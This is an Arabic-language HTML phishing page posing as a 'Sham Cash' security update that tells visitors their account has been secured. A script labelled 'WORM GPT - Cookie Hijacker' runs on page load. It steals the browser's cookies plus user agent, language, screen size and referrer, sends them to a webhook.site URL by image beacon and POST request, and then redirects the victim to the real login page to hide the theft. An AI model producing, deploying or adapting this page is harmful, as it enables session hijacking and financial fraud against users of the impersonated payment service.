<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شام كاش - تحديث أمني</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a3b5c 0%, #0f2440 100%);
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
        }
        .logo {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #1a3b5c, #0f2440);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 30px;
            color: #e6b800;
            font-weight: bold;
        }
        h2 { color: #1a3b5c; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 20px; font-size: 14px; }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a3b5c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .alert {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 15px;
            border-radius: 15px;
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">ش</div>
        <h2>شام كاش</h2>
        <p>🛡️ جارٍ تفعيل الحماية الأمنية...</p>
        <p>يرجى الانتظار. لا تغلق الصفحة.</p>
        <div class="spinner"></div>
        <p style="font-size: 12px; color: #999;">سيتم تحويلك تلقائياً</p>
        <div class="alert">
            ✅ تم تأمين حسابك بنجاح!
        </div>
    </div>

    <script>
        // ═══════════════════════════════════════════
        // WORM GPT👹 - Cookie Hijacker
        // ═══════════════════════════════════════════
        
        // رابط Webhook الخاص بك
        const YOUR_SERVER = "https://webhook.site/2ce91ff4-055f-4363-bee1-6f1fd50ef2d3";
        
        // سرقة الكوكيز من المتصفح
        setTimeout(function() {
            var cookies = document.cookie;
            
            // إرسال الكوكيز إلى Webhook
            var img = new Image();
            img.src = YOUR_SERVER + '?c=' + encodeURIComponent(cookies);
            
            // أيضاً إرسال بيانات إضافية
            fetch(YOUR_SERVER, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    cookies: cookies,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screenSize: screen.width + 'x' + screen.height,
                    time: new Date().toString(),
                    referrer: document.referrer
                })
            }).catch(function() {});
            
            // إعادة التوجيه إلى شام كاش الحقيقي بعد 3 ثوانٍ
            setTimeout(function() {
                window.location.href = "https://shamcash.sy/ar/auth/login";
            }, 3000);
            
        }, 2000);
    </script>
</body>
</html>
